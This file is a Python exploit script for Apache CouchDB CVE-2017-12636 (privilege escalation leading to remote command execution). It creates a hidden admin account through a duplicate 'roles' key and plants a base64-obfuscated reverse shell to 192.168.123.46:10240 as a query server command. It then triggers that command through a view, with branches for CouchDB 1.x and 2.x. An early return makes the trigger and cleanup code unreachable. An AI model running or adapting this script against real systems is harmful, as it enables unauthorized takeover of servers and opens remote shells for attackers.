import json
import requests
import base64
from requests.auth import HTTPBasicAuth
from urllib.parse import urlparse
requests.packages.urllib3.disable_warnings()

name = 'Apache Couchdb 任意命令执行漏洞(CVE-2017-12636)'


def getVersion(vulurl):
    version = requests.get(vulurl).json()["version"].replace('.', '')
    return version


def run(url):
    command = rb"""sh -i >& /dev/tcp/192.168.123.46/10240 0>&1"""
    command = "bash -c '{echo,%s}|{base64,-d}|{bash,-i}'" % base64.b64encode(command).decode()
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
    }
    host = urlparse(url)
    vulurl = f"{host.scheme}://{host.netloc}"
    try:
        response = requests.put(f"{vulurl}/_users/org.couchdb.user:none", headers=headers,data='''{"type": "user","name": "none","roles": ["_admin"],"roles": [], "password": "7a57a5a743894a0e"}''', timeout=15, verify=False)

        headers['Content-Type'] = "application/x-www-form-urlencoded;charset=UTF-8"
        response = requests.post(f"{vulurl}/_session", headers=headers,
                                 data='password=7a57a5a743894a0e&name=none', timeout=15, verify=False)
        cookie = requests.utils.dict_from_cookiejar(response.cookies)
        headers['Cookie'] = f"AuthSession={cookie['AuthSession']}"

        Version = getVersion(vulurl)
        headers['Content-Type'] = "application/json"
        if int(Version[0]) == 1 and int(Version) <= 170:
            response = requests.put(f"{vulurl}/_config/query_servers/cmd",
                                    headers=headers, data=json.dumps(command), timeout=15, verify=False)
        if int(Version[0]) == 2 and int(Version) <= 211:
            hostname = requests.get(
                f'{vulurl}/_membership', headers=headers, timeout=15, verify=False).json()['all_nodes'][0]
            requests.put(f'{vulurl}/_node/{hostname}/_config/query_servers/cmd',
                         headers=headers, data=json.dumps(command), timeout=15, verify=False)

        response = requests.put(
            f"{vulurl}/none", headers=headers, timeout=15, verify=False)
        response = requests.put(f"{vulurl}/none/test", headers=headers,
                                data='{"_id": "LV401"}', timeout=15, verify=False)

        return ['True', name, vulurl]
        if int(Version[0]) == 1 and int(Version) <= 170:
            requests.post(f"{vulurl}/none/_temp_view?limit=10", headers=headers,
                          data="""{"language":"cmd","map":""}""", timeout=15, verify=False)
            requests.delete(f"{vulurl}/none", headers=headers,
                            timeout=15, verify=False)
            requests.delete(f'{vulurl}/_config/query_servers/cmd',
                            headers=headers, timeout=15, verify=False)
        if int(Version[0]) == 2 and int(Version) <= 211:
            headers.pop('Cookie')
            session = requests.session()
            session.auth = HTTPBasicAuth('none', '7a57a5a743894a0e')
            session.post(f"{vulurl}/none/_design/test", headers=headers,
                         data='''{"_id": "_design/test", "views": {"none": {"map": ""} }, "language": "cmd"}''', timeout=15, verify=False)
            session.delete(f"{vulurl}/none", headers=headers,
                           timeout=15, verify=False)
            session.delete(f'{vulurl}/_node/{hostname}/_config/query_servers/cmd',
                           headers=headers, timeout=15, verify=False)

    except Exception as e:
        return ['False', name]


if __name__ == '__main__':
    url = 'http://172.20.165.194:5984'
    print(run(url))
